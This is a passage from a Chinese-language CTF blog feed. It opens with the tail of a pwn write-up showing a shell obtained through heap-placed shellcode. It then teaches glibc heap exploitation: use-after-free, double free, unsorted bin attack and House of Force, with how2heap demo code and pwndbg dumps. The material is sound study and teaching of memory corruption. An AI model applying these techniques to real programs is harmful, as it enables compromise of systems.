operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$ </code></pre><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这个题主要是shellcode 分布在几个堆中，利用jmp偏移实现跳转，同样的PIE的解决 也是通过bss段和got表的偏移<br><img src="https://s1.ax1x.com/2020/09/11/wtYbAf.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap--初探--基本漏洞</title>
      <link href="/2020/09/09/heap-chu-tan-ji-ben-lou-dong/"/>
      <url>/2020/09/09/heap-chu-tan-ji-ben-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="First-fit规则"><a href="#First-fit规则" class="headerlink" title="First fit规则"></a>First fit规则</h2><p><strong>在malloc一个chunk时，先在bins中寻找能满足用户需求大小的chunk，也就是大于等于用户需求的大小然后返回，而不是一直遍历到完全符合的chunk。</strong><br>比如说在unsortedbin中，找到了一个大于用户申请的chunk那么就会把这个chunk截断成最符合用户申请的大小然后返回，而剩下的那一块被填入Prev_size size等控制字段重新放入unsortedbin中。<br><img src="https://s1.ax1x.com/2020/09/09/w3Kl4K.png" alt=""><br>利用这个规则可以产生UAF（use after free）漏洞。<br>实在找不到就从top chunk 去切，还不行就调用brk函数增大top chunk（增加量不是很大），用户需求的brk无法满足，就会调用mmap函数去映射一大块虚拟内存给用户使用。</p><h2 id="UAF漏洞原理"><a href="#UAF漏洞原理" class="headerlink" title="UAF漏洞原理"></a>UAF漏洞原理</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span><span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>0xn<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">void</span><span class="token operator">*</span> matr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>0xm<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//其中m小于n</span></code></pre><p>这里在free了这个chunk后并没有让留有该chunk地址的ptr置空，即ptr还是指向者该chunk的user data处地址，毕竟free只是改变了关键控制字段而已。<br>然后再次malloc一个小于n的m空间，依据first fit规则会将上个chunk的user data处地址返回到matr中。<br>所以这个chunk就被两个指针控制。</p><p>例子：how2heap</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token constant">stderr</span>输出错误信息，没有缓冲区    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This can be exploited in a use-after-free situation.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> c<span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(0x512): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(0x256): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"we could continue mallocing here...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"now let's put a string at a that we can read later \"this is A!\"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">"this is A!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"first allocation %p points to %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the first one...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"So, let's allocate 0x500 bytes\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(0x500): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And put a different string here, \"this is C!\"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token string">"this is C!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd allocation %p points to %s\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"first allocation %p points to %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里先malloc了两个chunk，然后free掉chunk_a,继续malloc一个0x500的chunk_c.那么就会把之前chunk_a的user data地址返回（first fit规则）。<br>在chunk_a中先放入  this is A!  free后chunk_c再次指向同一个chunk，然后填充  this is C 所以i 最后输出chunk_c 和 chunk_a的内容都是一样的：this is C。如下</p><pre class=" language-java"><code class="language-java">This file doesn<span class="token string">'t demonstrate an attack, but shows the nature of glibc'</span>s allocator<span class="token punctuation">.</span>glibc uses a first<span class="token operator">-</span>fit algorithm to select a free chunk<span class="token punctuation">.</span>If a chunk is free and large enough<span class="token punctuation">,</span> malloc will select <span class="token keyword">this</span> chunk<span class="token punctuation">.</span>This can be exploited in a use<span class="token operator">-</span>after<span class="token operator">-</span>free situation<span class="token punctuation">.</span>Allocating <span class="token number">2</span> buffers<span class="token punctuation">.</span> They can be large<span class="token punctuation">,</span> don't have to be fastbin<span class="token punctuation">.</span>1st <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x512</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">0x1526010</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>2nd <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x256</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">0x1526530</span>we could <span class="token keyword">continue</span> mallocing here<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>now let's put a string at a that we can read later <span class="token string">"this is A!"</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>first allocation <span class="token number">0x1526010</span> points to <span class="token keyword">this</span> is A<span class="token operator">!</span>Freeing the first one<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>We don't need to free anything again<span class="token punctuation">.</span> As <span class="token keyword">long</span> as we allocate smaller than <span class="token number">0x512</span><span class="token punctuation">,</span> it will end up at <span class="token number">0x1526010</span>So<span class="token punctuation">,</span> let's allocate <span class="token number">0x500</span> bytes3rd <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">0x1526010</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>And put a different string here<span class="token punctuation">,</span> <span class="token string">"this is C!"</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>3rd allocation <span class="token number">0x1526010</span> points to <span class="token keyword">this</span> is C<span class="token operator">!</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>first allocation <span class="token number">0x1526010</span> points to <span class="token keyword">this</span> is C<span class="token operator">!</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>If we reuse the first allocation<span class="token punctuation">,</span> it now holds the data from the third allocation<span class="token punctuation">.</span></code></pre><p>至于为啥要mallocyige0x256，这个是为了防止free了chunk_a后chunk_a 和相邻 的top chunk合并（两个相邻的free chunk，fastbin的chunk除外），如果合并了那么chunk_a就没了就不会有first fit来利用了。<br><img src="https://s1.ax1x.com/2020/09/09/w3KQN6.png" alt=""></p><h2 id="Double-free"><a href="#Double-free" class="headerlink" title="Double free"></a>Double free</h2><p>顾名思义就是程序对同一个chunk进行了两次free</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span><span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>0xn<span class="token punctuation">)</span><span class="token keyword">void</span><span class="token operator">*</span> ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>0xm<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span></code></pre><p>注意不能接连两次free同一个chunk，稍微高一点版本的glibc就会报错。<br>大概情形如下<br><img src="https://s1.ax1x.com/2020/09/09/w3nNxH.png" alt=""><br>这个时候ptr会认为自己得到了一个可以使用的chunk，而这个chunk就是chunk1，与此同时fastbin以为自己这里还有一个free chunk—–chunk1.即chunk1同时被两个指针指向。<br>那么我就可以用ptr来修改chunk1中fd字段指向某个地址，使得fastbin以为自己除了chunk1又有了一个chunk。<br><img src="https://s1.ax1x.com/2020/09/09/w3nwqI.png" alt=""></p><h2 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted bin attack"></a>Unsorted bin attack</h2><pre class=" language-c"><code class="language-c">unsorted bin取出chunk的部分：<span class="token comment" spellcheck="true">/* remove from unsorted list */</span><span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>所以在取出一个free chunk之前如果能把该chunk的bk字段改为一个特殊地址-0x10那么，就会让unsortedbin认为在取出该free chunk后还要连接bk指向的chunk：<br><img src="https://s1.ax1x.com/2020/09/09/w3nBZt.png" alt=""><br>如上图，那么target（特殊地址）将会被填入bin_addr，而bin_addr放在libc.so的数据段所以会是一个很大的数字。我们就可以达到一个任意地址写入一个大数的目的。主要来修改一些起到限制作用的字段，如fastbins的最大链表。可以为其他的攻击创造环境</p><h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House_of_force"></a>House_of_force</h2><p>利用堆溢出修改top chunk的 size字段。<br><img src="https://s1.ax1x.com/2020/09/09/w3ndsA.png" alt=""><br>我们利用覆盖将top chunk的size覆盖为0xfffffffff（32位最大地址)那么top chunk就会被堆管理器认为是这么大，就可以来覆盖高地址内存空间的值（stack）<br>那么如果我想覆盖下面低地址的值呢，malloc负数即可，因为malloc里的那个参数是定义为无符号数，所以负数会被判定为很大的数。如-1就是0xffffffff（4字节）负数以补码形式存在。<br><strong>现在malloc(-16) ===&gt; malloc_base + 0xfffffff0   ====&gt;  (malloc_base-16) + 0xfffffff0+16 ===&gt;malloc_base-16.</strong><br><img src="https://s1.ax1x.com/2020/09/09/w3naMd.png" alt=""><br>这样就可以修改一些数据</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap--初探--bins神将</title>
      <link href="/2020/09/07/heap-chu-tan-bins-shen-jiang/"/>
      <url>/2020/09/07/heap-chu-tan-bins-shen-jiang/</url>
      
        <content type="html"><![CDATA[<p>Previously on Heap–初探–chunk的获取与释放：我们当时最大的疑惑差不多就是Free后的chunks都怎么了，这里来逐一解答。</p><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。<br>如果实在没有合适的就让商人去top chunk切一块下来<br>之后我们堆管理器的操作都是以chunk为最小单元，然后一般说的都是chunk地址而不是user_data_start 地址</p><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>链表的每个单元都由数据域与指针域组成。<br>单项链表：<br><img src="https://s1.ax1x.com/2020/09/07/wKAqt1.png" alt=""></p><p>双向循环链表:<br><img src="https://s1.ax1x.com/2020/09/07/wKALfx.png" alt=""></p><h2 id="Fastbins"><a href="#Fastbins" class="headerlink" title="Fastbins"></a>Fastbins</h2><blockquote><p>大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了合并、分割以及中间检查的过程中。<br>因此，ptmalloc 中专门设计了 fast bin–ctfwiki-pwn<br>为了提高chunk获取和释放的效率，fastbins采用单链表数据结构来存储对应大小的free chunks，并且采用了FILO策略先进先出，利用的是fd进行单链表链接，而不是bk。链表如下：<br><img src="https://s1.ax1x.com/2020/09/07/wKAbkR.png" alt=""><br>所以在free一个可以被放入fastbins的chunk后，他会像压入栈里面一样压入对应的bin（对应大小的bin）中同时其fd会被填入free chunk3的地址（如上图）<br>这就是为啥之前我们在free一个chunk后（被放入了fastbins）我们再去看那个chunk里面的数据fd字段改变的原因。<br>例子：</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>gdb执行到return 0；</p><pre class=" language-java"><code class="language-java">In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>test<span class="token punctuation">.</span>c   <span class="token number">10</span>    <span class="token number">11</span>     <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">12</span>     <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">13</span>     <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">14</span>     <span class="token function">free</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span> ► <span class="token number">15</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">16</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffdda0</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token number">0x0</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffdda8</span> —▸ <span class="token number">0x602040</span> —▸ <span class="token number">0x602000</span> ◂— <span class="token number">0x0</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│      <span class="token number">0x7fffffffddb0</span> —▸ <span class="token number">0x602070</span> —▸ <span class="token number">0x602030</span> ◂— <span class="token number">0x0</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffddb8</span> —▸ <span class="token number">0x6020a0</span> —▸ <span class="token number">0x602060</span> ◂— <span class="token number">0x0</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│ rbp  <span class="token number">0x7fffffffddc0</span> —▸ <span class="token function">0x4005e0</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffddc8</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffddd0</span> ◂— <span class="token number">0x1</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffddd8</span> —▸ <span class="token number">0x7fffffffdea8</span> —▸ <span class="token number">0x7fffffffe249</span> ◂— <span class="token string">'/home/matrix/a.out'</span>────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           4005d6 main<span class="token operator">+</span><span class="token number">112</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x602010-</span><span class="token number">0x10</span><span class="token number">0x602000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk1<span class="token number">0x602010</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>  <span class="token number">0x602020</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span> <span class="token number">0x602030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk2<span class="token number">0x602040</span><span class="token operator">:</span>    <span class="token number">0x0000000000602000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602050</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602060</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk3<span class="token number">0x602070</span><span class="token operator">:</span>    <span class="token number">0x0000000000602030</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602080</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602090</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk4<span class="token number">0x6020a0</span><span class="token operator">:</span>    <span class="token number">0x0000000000602060</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x6020b0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x6020c0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020f41</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> top chunk<span class="token number">0x6020d0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre><p>可以看到在free了这四个一样的chunk后：chunk4=====&gt;chunk3=====&gt;chunk2=====&gt;chunk1<br><strong>注意这里按理说前一个chunk是free状态然后当前chunk 的size的最后位应该置0。但是这里设计fastbins为了防止相邻两的freechunk合并的情况，就把里面的free chunk的size最后的P位都置1，因为合并后可能又要分类啥的太花费时间了。</strong></p><h2 id="其他bins"><a href="#其他bins" class="headerlink" title="其他bins"></a>其他bins</h2><p>除了fastbins（tache）其他的bins都是双向链表结构。很相似（除largebins）如下。其数据存放规则是FIFO：先进先出<br><img src="https://s1.ax1x.com/2020/09/07/wKV1VH.png" alt=""></p><h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><p>存放刚刚释放还未分类且无法进入fastbins中的free chunks，相当于相当于small bins 和large bins的缓冲区。<br><strong>如果用户malloc的大小大于fastbins里面的free chunks那么对管理器会先在unsorted bin中找，如果没找到就会触发unsorted bin中的free chunks遍历并合并，归类到他们该去的bins</strong><br>这里面的chunks很没有规律，大大小小的都有，只有一个bin来存放，是名副其实的垃圾堆。但是可以减少程序中的碎片free chunks</p><h3 id="smallbins"><a href="#smallbins" class="headerlink" title="smallbins"></a>smallbins</h3><p>small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下<br> 下标 | SIZE_SZ=4（32 位）| SIZE_SZ=8（64 位）<br>–:|:—:|:–<br>2 | 16 | 32<br>3 | 24 | 48<br>4 | 32 | 64<br>5 | 40 | 80<br>x | 2*4*x | 2*8*x<br>63 | 504 | 1008<br>每个bin链表中存放的chunks大小都一致</p><p>可以发现这里的free chunks大小与fastbins中的大小是有一部分重叠的，这背后的原理比较复杂先暂且放放。</p><h3 id="largebins"><a href="#largebins" class="headerlink" title="largebins"></a>largebins</h3><p>有63个bins，管理大于1008bytes的free chunks （64位）但是在基础heap题中一般不会遇到</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap--初探--chunk的获取与释放</title>
      <link href="/2020/09/07/heap-chu-tan-chunk-de-huo-qu-yu-shi-fang/"/>
      <url>/2020/09/07/heap-chu-tan-chunk-de-huo-qu-yu-shi-fang/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。<br><strong>其生长方向是正常的从低地址向高地址生长</strong>，栈的高地址向低地址生长就像个异类。堆可以申请到的内存空间比栈要大很多，在 linux 的 4G 的虚拟内存空间里最高可以达到 2.9 G 的空间。<br>对堆的操作是由堆管理器（ptmalloc2）进行的,并不是操作系统。<br><img src="https://s1.ax1x.com/2020/09/07/wu3QoT.png" alt=""><br>堆管理器就像是一个批发商，在malloc分配堆空间时就会向操作系统‘进货‘ 当然就像商人一样进一大批货物（堆空间）这样在程序多次进行malloc申请内存时就不需要频繁的访问操作系统，可以直接向堆管理器进行请求，大量减少了系统调用的开销，提高程序运行性能。<br><img src="https://s1.ax1x.com/2020/09/07/wu3MwV.png" alt=""></p><h3 id="堆的定义与结构"><a href="#堆的定义与结构" class="headerlink" title="堆的定义与结构"></a>堆的定义与结构</h3><p><strong>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk **。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示，当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</strong>chunk也就是堆操作的最小执行单元。**</p><p><strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong>，我们来看看它的数据结构定义：</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*  This struct declaration is misleading (but accurate and necessary).  It declares a "view" into memory allowing access to necessary  fields at known offsets from a given base. See explanation below.*/</span><span class="token keyword">struct</span> malloc_chunk <span class="token punctuation">{</span>  INTERNAL_SIZE_T      prev_size<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Size of previous chunk (if free).  */</span>  INTERNAL_SIZE_T      size<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* Size in bytes, including overhead. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> fd<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Only used for large blocks: pointer to next larger size.  */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token 